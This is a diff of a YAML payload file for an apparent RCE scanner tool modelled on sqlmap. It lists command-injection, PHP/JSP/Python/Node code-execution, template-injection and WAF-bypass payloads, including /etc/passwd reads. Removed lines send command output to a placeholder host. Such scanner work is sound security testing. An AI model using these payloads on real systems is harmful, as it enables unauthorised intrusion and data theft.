@@ -1,120 +1,599 @@
+# RCE HawkEye Payload Configuration
+# 借鉴sqlmap的payload.xml设计
+
 payloads:
+  # ==================== 时间盲注 Payload ====================
   time_based:
     unix:
-      - content: "; sleep 5;"
-        description: "Unix时间盲注 - 分号分隔"
-        delay: 5
-      - content: "| sleep 5 |"
-        description: "Unix时间盲注 - 管道符"
-        delay: 5
-      - content: "&& sleep 5 &&"
-        description: "Unix时间盲注 - AND连接"
-        delay: 5
-      - content: "|| sleep 5 ||"
-        description: "Unix时间盲注 - OR连接"
-        delay: 5
-      - content: "`sleep 5`"
-        description: "Unix时间盲注 - 反引号执行"
-        delay: 5
-      - content: "$(sleep 5)"
-        description: "Unix时间盲注 - $()执行"
-        delay: 5
-      - content: "\n sleep 5"
-        description: "Unix时间盲注 - 换行符"
-        delay: 5
-      - content: "; ping -c 5 127.0.0.1;"
-        description: "Unix时间盲注 - ping延迟"
-        delay: 5
-    
-    windows:
-      - content: "& timeout 5"
-        description: "Windows时间盲注 - &连接"
-        delay: 5
-      - content: "| timeout 5"
-        description: "Windows时间盲注 - 管道符"
-        delay: 5
-      - content: "&& timeout 5"
-        description: "Windows时间盲注 - AND连接"
-        delay: 5
-      - content: "|| ping -n 5 127.0.0.1"
-        description: "Windows时间盲注 - ping延迟"
-        delay: 5
+      - title: "Unix sleep时间盲注"
+        level: 1
+        risk: 1
+        payload: "; sleep [SLEEPTIME];"
+        description: "Unix系统sleep命令时间盲注"
+        os: unix
+        
+      - title: "Unix管道sleep"
+        level: 1
+        risk: 1
+        payload: "| sleep [SLEEPTIME]"
+        description: "管道符执行sleep"
+        os: unix
+        
+      - title: "Unix反引号sleep"
+        level: 2
+        risk: 1
+        payload: "`sleep [SLEEPTIME]`"
+        description: "反引号执行sleep"
+        os: unix
+        
+      - title: "Unix $()执行sleep"
+        level: 2
+        risk: 1
+        payload: "$(sleep [SLEEPTIME])"
+        description: "$()执行sleep"
+        os: unix
+        
+      - title: "Unix &&连接sleep"
+        level: 2
+        risk: 1
+        payload: "&& sleep [SLEEPTIME]"
+        description: "AND连接执行sleep"
+        os: unix
+        
+      - title: "Unix换行符执行sleep"
+        level: 3
+        risk: 1
+        payload: "%0asleep [SLEEPTIME]"
+        description: "换行符URL编码执行"
+        os: unix
 
+    windows:
+      - title: "Windows timeout时间盲注"
+        level: 1
+        risk: 1
+        payload: "& timeout [SLEEPTIME]"
+        description: "Windows timeout命令时间盲注"
+        os: windows
+        
+      - title: "Windows ping延迟"
+        level: 2
+        risk: 1
+        payload: "| ping -n [SLEEPTIME] 127.0.0.1"
+        description: "ping命令延迟"
+        os: windows
+        
+      - title: "Windows waitfor延迟"
+        level: 3
+        risk: 1
+        payload: "& waitfor /t [SLEEPTIME] pause"
+        description: "waitfor命令延迟"
+        os: windows
+
+  # ==================== 回显型 Payload ====================
   echo_based:
     unix:
-      - content: "; echo 'RCE_TEST_MARKER_12345';"
-        description: "Unix回显测试"
-        marker: "RCE_TEST_MARKER_12345"
-      - content: "| echo RCE_TEST_MARKER_12345 |"
-        description: "Unix回显测试 - 管道符"
-        marker: "RCE_TEST_MARKER_12345"
-      - content: "; id;"
-        description: "Unix用户信息泄露"
-        marker: "uid="
-      - content: "; whoami;"
-        description: "Unix用户名泄露"
-        marker: null
-    
-    windows:
-      - content: "& echo RCE_TEST_MARKER_12345"
-        description: "Windows回显测试"
-        marker: "RCE_TEST_MARKER_12345"
-      - content: "| echo RCE_TEST_MARKER_12345"
-        description: "Windows回显测试 - 管道符"
-        marker: "RCE_TEST_MARKER_12345"
-      - content: "& whoami"
-        description: "Windows用户名泄露"
-        marker: null
+      - title: "Unix ls命令"
+        level: 1
+        risk: 2
+        payload: "; ls;"
+        expected_output: null
+        description: "列出当前目录"
+        os: unix
+        
+      - title: "Unix ls -la命令"
+        level: 1
+        risk: 2
+        payload: "; ls -la;"
+        expected_output: "total"
+        description: "列出详细信息"
+        os: unix
+        
+      - title: "Unix whoami命令"
+        level: 1
+        risk: 2
+        payload: "; whoami;"
+        expected_output: null
+        description: "显示当前用户"
+        os: unix
+        
+      - title: "Unix id命令"
+        level: 1
+        risk: 2
+        payload: "; id;"
+        expected_output: "uid="
+        description: "显示用户ID"
+        os: unix
+        
+      - title: "Unix pwd命令"
+        level: 1
+        risk: 2
+        payload: "; pwd;"
+        expected_output: "/"
+        description: "显示当前路径"
+        os: unix
+        
+      - title: "Unix uname命令"
+        level: 2
+        risk: 2
+        payload: "; uname -a;"
+        expected_output: "Linux"
+        description: "显示系统信息"
+        os: unix
+        
+      - title: "Unix cat passwd"
+        level: 2
+        risk: 3
+        payload: "; cat /etc/passwd;"
+        expected_output: "root:"
+        description: "读取passwd文件"
+        os: unix
 
-  dns_based:
+    windows:
+      - title: "Windows dir命令"
+        level: 1
+        risk: 2
+        payload: "& dir"
+        expected_output: null
+        description: "列出目录"
+        os: windows
+        
+      - title: "Windows whoami命令"
+        level: 1
+        risk: 2
+        payload: "& whoami"
+        expected_output: null
+        description: "显示当前用户"
+        os: windows
+        
+      - title: "Windows ver命令"
+        level: 2
+        risk: 2
+        payload: "& ver"
+        expected_output: "Windows"
+        description: "显示系统版本"
+        os: windows
+
+  # ==================== PHP代码执行 Payload ====================
+  php:
+    - title: "PHP system函数"
+      level: 1
+      risk: 2
+      payload: "system('id');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP system()函数执行"
+      
+    - title: "PHP exec函数"
+      level: 1
+      risk: 2
+      payload: "exec('id');"
+      tech: php
+      expected_output: null
+      description: "PHP exec()函数执行"
+      
+    - title: "PHP shell_exec函数"
+      level: 1
+      risk: 2
+      payload: "shell_exec('id');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP shell_exec()函数执行"
+      
+    - title: "PHP passthru函数"
+      level: 1
+      risk: 2
+      payload: "passthru('id');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP passthru()函数执行"
+      
+    - title: "PHP反引号执行"
+      level: 1
+      risk: 2
+      payload: "`id`"
+      tech: php
+      expected_output: "uid="
+      description: "PHP反引号执行命令"
+      
+    - title: "PHP popen函数"
+      level: 2
+      risk: 2
+      payload: "popen('id','r');"
+      tech: php
+      expected_output: null
+      description: "PHP popen()函数执行"
+      
+    - title: "PHP proc_open函数"
+      level: 3
+      risk: 2
+      payload: "proc_open('id',[],$pipes);"
+      tech: php
+      expected_output: null
+      description: "PHP proc_open()函数执行"
+      
+    - title: "PHP assert执行"
+      level: 2
+      risk: 2
+      payload: "assert('system(\"id\")');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP assert()执行"
+      
+    - title: "PHP preg_replace /e"
+      level: 3
+      risk: 2
+      payload: "preg_replace('/.*/e','system(\"id\")','');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP preg_replace /e修饰符"
+      
+    - title: "PHP create_function"
+      level: 3
+      risk: 2
+      payload: "create_function('','system(\"id\");');"
+      tech: php
+      expected_output: null
+      description: "PHP create_function()执行"
+      
+    - title: "PHP array_map"
+      level: 2
+      risk: 2
+      payload: "array_map('system',array('id'));"
+      tech: php
+      expected_output: "uid="
+      description: "PHP array_map()执行"
+      
+    - title: "PHP call_user_func"
+      level: 2
+      risk: 2
+      payload: "call_user_func('system','id');"
+      tech: php
+      expected_output: "uid="
+      description: "PHP call_user_func()执行"
+
+  # ==================== JSP代码执行 Payload ====================
+  jsp:
+    - title: "JSP Runtime.exec"
+      level: 1
+      risk: 2
+      payload: "<%Runtime.getRuntime().exec(\"id\");%>"
+      tech: jsp
+      expected_output: null
+      description: "JSP Runtime.exec()执行"
+      
+    - title: "JSP ProcessBuilder"
+      level: 2
+      risk: 2
+      payload: "<%new java.lang.ProcessBuilder(\"id\").start();%>"
+      tech: jsp
+      expected_output: null
+      description: "JSP ProcessBuilder执行"
+      
+    - title: "JSP EL表达式"
+      level: 2
+      risk: 2
+      payload: "#{Runtime.getRuntime().exec('id')}"
+      tech: jsp
+      expected_output: null
+      description: "EL表达式执行"
+      
+    - title: "JSP Spring EL"
+      level: 2
+      risk: 2
+      payload: "${Runtime.getRuntime().exec('id')}"
+      tech: jsp
+      expected_output: null
+      description: "Spring EL表达式执行"
+
+  # ==================== Python代码执行 Payload ====================
+  python:
+    - title: "Python __import__ os.system"
+      level: 1
+      risk: 2
+      payload: "__import__('os').system('id')"
+      tech: python
+      expected_output: "uid="
+      description: "Python __import__执行"
+      
+    - title: "Python os.popen"
+      level: 1
+      risk: 2
+      payload: "__import__('os').popen('id').read()"
+      tech: python
+      expected_output: "uid="
+      description: "Python os.popen执行"
+      
+    - title: "Python subprocess"
+      level: 2
+      risk: 2
+      payload: "__import__('subprocess').check_output('id',shell=True)"
+      tech: python
+      expected_output: "uid="
+      description: "Python subprocess执行"
+      
+    - title: "Python eval"
+      level: 2
+      risk: 2
+      payload: "eval('__import__(\"os\").system(\"id\")')"
+      tech: python
+      expected_output: "uid="
+      description: "Python eval执行"
+      
+    - title: "Python exec"
+      level: 2
+      risk: 2
+      payload: "exec('__import__(\"os\").system(\"id\")')"
+      tech: python
+      expected_output: null
+      description: "Python exec执行"
+
+  # ==================== Node.js代码执行 Payload ====================
+  nodejs:
+    - title: "Node.js require exec"
+      level: 1
+      risk: 2
+      payload: "require('child_process').exec('id')"
+      tech: nodejs
+      expected_output: "uid="
+      description: "Node.js require执行"
+      
+    - title: "Node.js execSync"
+      level: 1
+      risk: 2
+      payload: "require('child_process').execSync('id').toString()"
+      tech: nodejs
+      expected_output: "uid="
+      description: "Node.js execSync执行"
+      
+    - title: "Node.js spawn"
+      level: 2
+      risk: 2
+      payload: "require('child_process').spawn('id')"
+      tech: nodejs
+      expected_output: null
+      description: "Node.js spawn执行"
+      
+    - title: "Node.js global.process"
+      level: 3
+      risk: 2
+      payload: "global.process.mainModule.require('child_process').exec('id')"
+      tech: nodejs
+      expected_output: "uid="
+      description: "Node.js global.process执行"
+      
+    - title: "Node.js constructor chain"
+      level: 3
+      risk: 2
+      payload: "this.constructor.constructor('return process')().mainModule.require('child_process').exec('id')"
+      tech: nodejs
+      expected_output: "uid="
+      description: "Node.js constructor链执行"
+
+  # ==================== 模板注入 Payload ====================
+  template:
+    - title: "SSTI测试 7*7"
+      level: 1
+      risk: 1
+      payload: "{{7*7}}"
+      tech: template
+      expected_output: "49"
+      description: "模板注入测试"
+      
+    - title: "Jinja2 config"
+      level: 2
+      risk: 2
+      payload: "{{config}}"
+      tech: template
+      expected_output: null
+      description: "Jinja2配置读取"
+      
+    - title: "Jinja2 subclasses"
+      level: 3
+      risk: 3
+      payload: "{{self.__class__.__mro__[1].__subclasses__()}}"
+      tech: template
+      expected_output: null
+      description: "Jinja2子类枚举"
+      
+    - title: "Jinja2文件读取"
+      level: 3
+      risk: 3
+      payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+      tech: template
+      expected_output: "root:"
+      description: "Jinja2文件读取"
+      
+    - title: "FreeMarker执行"
+      level: 3
+      risk: 3
+      payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+      tech: template
+      expected_output: "uid="
+      description: "FreeMarker命令执行"
+      
+    - title: "Thymeleaf执行"
+      level: 3
+      risk: 3
+      payload: "${T(java.lang.Runtime).getRuntime().exec('id')}"
+      tech: template
+      expected_output: null
+      description: "Thymeleaf命令执行"
+
+  # ==================== WAF绕过 Payload ====================
+  waf_bypass:
     unix:
-      - content: "; nslookup $(whoami).dns.example.com;"
-        description: "Unix DNS外带测试"
-      - content: "; curl http://dns.example.com/$(whoami);"
-        description: "Unix HTTP外带测试"
-      - content: "; wget http://dns.example.com/?d=$(id|base64);"
-        description: "Unix wget外带测试"
-    
-    windows:
-      - content: "| nslookup %USERNAME%.dns.example.com"
-        description: "Windows DNS外带测试"
-      - content: "& curl http://dns.example.com/?u=%USERNAME%"
-        description: "Windows HTTP外带测试"
+      - title: "引号分割ls"
+        level: 2
+        risk: 2
+        payload: "; l''s;"
+        description: "引号分割绕过"
+        os: unix
+        
+      - title: "反斜杠ls"
+        level: 2
+        risk: 2
+        payload: "; l\\s;"
+        description: "反斜杠绕过"
+        os: unix
+        
+      - title: "变量切片ls"
+        level: 3
+        risk: 2
+        payload: "; l${PATH:0:0}s;"
+        description: "变量切片绕过"
+        os: unix
+        
+      - title: "IFS变量ls"
+        level: 3
+        risk: 2
+        payload: "; l${IFS}s;"
+        description: "IFS变量绕过"
+        os: unix
+        
+      - title: "大括号扩展ls"
+        level: 2
+        risk: 2
+        payload: "; {ls,};"
+        description: "大括号扩展绕过"
+        os: unix
+        
+      - title: "printf十六进制"
+        level: 3
+        risk: 2
+        payload: ";$(printf'\\x6c\\x73');"
+        description: "printf十六进制绕过"
+        os: unix
+        
+      - title: "base64解码"
+        level: 3
+        risk: 2
+        payload: ";$(echo'bHM='|base64-d);"
+        description: "base64解码绕过"
+        os: unix
+        
+      - title: "通配符cat"
+        level: 3
+        risk: 3
+        payload: "; /???/??t /???/p??s??;"
+        description: "通配符路径绕过"
+        os: unix
 
-  file_based:
-    unix:
-      - content: "; id > /tmp/rce_test.txt;"
-        description: "Unix文件写入测试"
-        check_file: "/tmp/rce_test.txt"
-      - content: "; ls -la > /tmp/rce_ls.txt;"
-        description: "Unix目录列表写入"
-        check_file: "/tmp/rce_ls.txt"
-    
     windows:
-      - content: "& whoami > C:\\temp\\rce_test.txt"
-        description: "Windows文件写入测试"
-        check_file: "C:\\temp\\rce_test.txt"
-      - content: "& dir > C:\\temp\\rce_dir.txt"
-        description: "Windows目录列表写入"
-        check_file: "C:\\temp\\rce_dir.txt"
+      - title: "脱字符dir"
+        level: 2
+        risk: 2
+        payload: "& d^ir"
+        description: "Windows脱字符绕过"
+        os: windows
+        
+      - title: "引号dir"
+        level: 2
+        risk: 2
+        payload: "& di''r"
+        description: "Windows引号绕过"
+        os: windows
+        
+      - title: "变量调用dir"
+        level: 3
+        risk: 2
+        payload: "& set /a=dir&call %a%"
+        description: "变量调用绕过"
+        os: windows
+        
+      - title: "PowerShell Base64"
+        level: 3
+        risk: 2
+        payload: "& powershell -enc ZABpAHIA"
+        description: "PowerShell编码绕过"
+        os: windows
 
-  bypass:
-    space_bypass:
-      - content: ";${IFS}sleep${IFS}5;"
-        description: "空格绕过 - IFS变量"
-      - content: ";{sleep,5};"
-        description: "空格绕过 - 大括号"
+    php:
+      - title: "PHP大小写绕过"
+        level: 2
+        risk: 2
+        payload: "sYsTeM('id');"
+        tech: php
+        description: "PHP函数大小写绕过"
+        
+      - title: "PHP注释分割"
+        level: 2
+        risk: 2
+        payload: "sys/**/tem('id');"
+        tech: php
+        description: "PHP注释分割绕过"
+        
+      - title: "PHP括号绕过"
+        level: 2
+        risk: 2
+        payload: "(system)('id');"
+        tech: php
+        description: "PHP括号绕过"
+        
+      - title: "PHP动态函数"
+        level: 3
+        risk: 2
+        payload: "define('x','system');x('id');"
+        tech: php
+        description: "PHP动态函数绕过"
+        
+      - title: "PHP字符串拼接"
+        level: 3
+        risk: 2
+        payload: "$a='sys';$b='tem';$a.$b('id');"
+        tech: php
+        description: "PHP字符串拼接绕过"
+
+# ==================== Tamper脚本链配置 ====================
+tamper_chains:
+  - name: "basic_encode"
+    scripts: ["urlencode"]
+    description: "基础URL编码"
     
-    filter_bypass:
-      - content: "; s''leep 5;"
-        description: "关键字绕过 - 引号分割"
-      - content: "; sle\\ep 5;"
-        description: "关键字绕过 - 反斜杠"
-      - content: "; sl$@eep 5;"
-        description: "关键字绕过 - 特殊字符"
+  - name: "double_encode"
+    scripts: ["doubleurlencode"]
+    description: "双重URL编码"
     
-    encoding:
-      - content: "%3bsleep%205%3b"
-        description: "URL编码绕过"
-      - content: "Ow=="
-        description: "Base64编码"
+  - name: "space_bypass"
+    scripts: ["space2comment"]
+    description: "空格注释绕过"
+    
+  - name: "case_bypass"
+    scripts: ["randomcase"]
+    description: "大小写混淆绕过"
+    
+  - name: "modsecurity_bypass"
+    scripts: ["modsecurityversioned"]
+    description: "ModSecurity绕过"
+    
+  - name: "combined_bypass"
+    scripts: ["space2comment", "randomcase", "urlencode"]
+    description: "组合绕过"
+
+# ==================== Level/Risk配置 ====================
+levels:
+  1:
+    description: "基础检测 - 测试最常见Payload"
+    max_payloads_per_param: 10
+  2:
+    description: "标准检测 - 平衡速度和覆盖率"
+    max_payloads_per_param: 30
+  3:
+    description: "深度检测 - 全面测试"
+    max_payloads_per_param: 60
+  4:
+    description: "完全检测 - 测试所有Payload"
+    max_payloads_per_param: null
+  5:
+    description: "exhaustive检测 - 包含所有变体"
+    max_payloads_per_param: null
+
+risks:
+  1:
+    description: "无害 - 仅时间盲注"
+    allowed_types: ["time_based"]
+  2:
+    description: "低风险 - 基础命令执行"
+    allowed_types: ["time_based", "echo_based", "code_exec"]
+  3:
+    description: "中等风险 - 敏感命令"
+    allowed_types: ["time_based", "echo_based", "code_exec", "file_read"]
